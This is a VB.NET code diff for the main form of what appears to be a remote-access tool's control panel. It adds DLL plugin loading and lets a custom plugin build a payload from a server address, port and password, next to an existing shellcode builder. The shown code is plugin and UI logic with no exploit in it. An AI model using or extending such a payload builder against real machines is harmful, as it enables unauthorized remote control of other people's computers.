@@ -213,7 +213,28 @@ Public Class frmmain
         Return True
     End Function
 
+    Private Function BuilderPlugin_Init()
+        Dim pluginDirectory As String = (Application.StartupPath & "\Plugins\Builder\")
+        Dim dllList As String() = Directory.GetFileSystemEntries(pluginDirectory, "*.dll")
+        Dim builderMgrObj As clsBuilderPluginMgr = mGlobal.GetBuilderPluginMgrObj()
+        For Each dllName As String In dllList
+            Try
+                If (builderMgrObj.LoadPlugin(dllName) = False) Then
+                    Log("Failed to load plugin " & Utilities.TrimPath(dllName))
+                End If
+            Catch ex As Exception
+                Log("Error while loading plugin " & Utilities.TrimPath(dllName))
+            End Try
+        Next
+
+        cbBuildPlugin.Items.Clear()
+        For Each builderPlugin As clsBuilderPlugin In builderMgrObj.GetBuilderPluginList()
+            cbBuildPlugin.Items.Add(builderPlugin.GetPluginInstance().GetPluginName())
+        Next
+        Return True
+    End Function
     Private Function Global_Init() As Boolean
+        Log("Program has been started!")
         SetAbout()
         Setting_Init()
         InitImgList()
@@ -221,8 +242,8 @@ Public Class frmmain
         Timer_Init()
         TCP_Init()
         ClientMgr_Init()
+        BuilderPlugin_Init()
         RefreshBLockIPListBox()
-        Log("Program has been started!")
         Return True
     End Function
 
@@ -427,8 +448,12 @@ Public Class frmmain
         ElseIf opBuildShell.Checked Then
             buildBinary = buildObj.BuildShellcode(txtBuildServer.Text, Convert.ToInt32(txtBuildPort.Text), txtPassword.Text)
         ElseIf opBuildCustom.Checked Then
-            MsgBox("Not support as this time", MsgBoxStyle.Critical, "Ops")
-            Return
+            Dim buildPlugin As clsBuilderPlugin = mGlobal.GetBuilderPluginMgrObj().GetBuilderPluginByName(cbBuildPlugin.Text)
+            If buildPlugin Is Nothing Then
+                MsgBox("Invalid builder plugin", MsgBoxStyle.Critical, "Error")
+                Exit Sub
+            End If
+            buildBinary = buildPlugin.GetPluginInstance().OnBuild(txtBuildServer.Text, Convert.ToInt32(txtBuildPort.Text), txtPassword.Text)
         End If
         If buildBinary IsNot Nothing Then
             Dim saveDialog As New SaveFileDialog()
